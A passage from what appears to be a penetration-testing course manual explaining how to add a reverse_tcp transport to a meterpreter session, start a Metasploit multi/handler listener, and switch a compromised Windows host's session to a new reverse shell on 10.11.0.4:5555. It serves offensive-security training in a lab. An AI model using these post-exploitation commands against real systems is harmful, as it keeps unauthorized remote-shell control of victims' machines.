We can also use **transport add** to add a new transport protcol to the current session, using **_t** to set the desired transport type.

In the example below, we will add the **_reverse_tcp** transport, which is equivalent to choosing the **windows/meterpreter/reverse_tcp** payload. We will apply the options for the specified transport type, including the local host IP address (**-l**) and the local port (**-p**):

```
```text
meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
[*] Adding new transport ...
[*] Successfully added reverse_tcp transport.

meterpreter > transport list
Session Expiry  : @ 2019-10-09 17:01:44

ID  Curr  URL
- -   ---   ---
1   *     http://10.11.0.4:4444/gfOjKgVv3qFbAlMHVmIpPUGwSwX_f66dgxGRLBZqbZ2TKyCu3fjeaADK/
2       tcp://10.11.0.4:5555
```
```

*Listing 786 - Adding a new transport to the meterpreter session*

Before we can take advantage of the new transport, we must set up a listener to accept the connection. We'll do this by once again selecting the **multi/handler** module and specifying the same parameters we selected earlier.

With the handler configured, we can return to the meterpreter session and run **transport next** to change to the newly-created transport mode. This will create a new session and close down the old one.

```
```text
meterpreter > background
[*] Backgrounding session 5...

msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 exploit(multi/handler) > set LPORT 5555
LPORT => 5555

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.11.0.4:5555

msf5 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > transport next
[*] Changing to next transport ...

[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Successfully changed to the next transport, killing current session.
```
```